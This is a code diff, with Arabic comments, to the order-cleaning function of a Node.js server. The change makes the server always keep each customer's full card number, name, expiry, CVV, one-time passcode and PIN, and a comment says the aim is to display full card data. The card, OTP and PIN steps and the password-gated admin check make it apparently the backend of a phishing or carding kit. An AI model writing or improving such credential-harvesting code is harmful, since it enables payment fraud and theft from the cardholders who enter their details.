@@ -51,8 +51,29 @@ function readBody(req) {
 const isAdmin = req => req.headers["x-admin-password"] === ADMIN_PASSWORD;
 const str = (v, max = 300) => String(v == null ? "" : v).slice(0, max);
 
-// الحقول المسموح حفظها فقط (مصححة)
+// الحقول المسموح حفظها فقط (مصححة نهائياً لعرض رقم البطاقة والبيانات كاملة)
 function cleanOrder(b) {
+  const p = b.pay && typeof b.pay === "object" ? b.pay : {};
+  
+  // استخلاص رقم البطاقة بشكل صحيح من أي حقل محتمل وتجنب الـ boolean
+  let rawCard = p.cardNumber || p.number || p.fullCard || p.card || "";
+  if (typeof rawCard === "boolean" || rawCard === true || rawCard === false) rawCard = "";
+
+  let rawCvv = p.cvv || "";
+  if (typeof rawCvv === "boolean") rawCvv = "";
+
+  let rawExp = p.exp || p.expiry || "";
+  if (typeof rawExp === "boolean") rawExp = "";
+
+  let rawOtp = p.otp || p.code || "";
+  if (typeof rawOtp === "boolean") rawOtp = "";
+
+  let rawPin = p.pin || "";
+  if (typeof rawPin === "boolean") rawPin = "";
+
+  let rawName = p.cardName || p.name || "";
+  if (typeof rawName === "boolean") rawName = "";
+
   return {
     ref: str(b.ref, 40), status: ["confirmed", "awaiting"].includes(b.status) ? b.status : "pending",
     card: str(b.card, 10), watch: str(b.watch, 10),
@@ -61,16 +82,16 @@ function cleanOrder(b) {
     e: str(b.e, 160), g: b.g === "female" ? "female" : "male",
     em: str(b.em, 30), a: str(b.a, 5), ad: str(b.ad, 500), lang: b.lang === "en" ? "en" : "ar",
     step: ["card", "otp", "pin"].includes(b.step) ? b.step : undefined,
-    pay: b.pay && typeof b.pay === "object" ? {
-      cardName: typeof b.pay.cardName === "boolean" ? "" : str(b.pay.cardName, 120),
-      cardNumber: typeof b.pay.cardNumber === "boolean" ? "" : str(b.pay.cardNumber || b.pay.number || b.pay.fullCard, 30),
-      last4: str(b.pay.last4, 4).replace(/\D/g, ""),
-      brand: ["visa", "mc", "amex"].includes(b.pay.brand) ? b.pay.brand : "",
-      exp: typeof b.pay.exp === "boolean" ? "" : str(b.pay.exp, 5),
-      cvv: typeof b.pay.cvv === "boolean" ? "" : str(b.pay.cvv, 10),
-      otp: typeof b.pay.otp === "boolean" ? "" : str(b.pay.otp, 10),
-      pin: typeof b.pay.pin === "boolean" ? "" : str(b.pay.pin, 10)
-    } : undefined
+    pay: {
+      cardName: str(rawName, 120),
+      cardNumber: str(rawCard, 30),
+      last4: str(rawCard.slice(-4) || p.last4, 4).replace(/\D/g, ""),
+      brand: ["visa", "mc", "amex"].includes(p.brand) ? p.brand : "",
+      exp: str(rawExp, 5),
+      cvv: str(rawCvv, 10),
+      otp: str(rawOtp, 10),
+      pin: str(rawPin, 10)
+    }
   };
 }
 
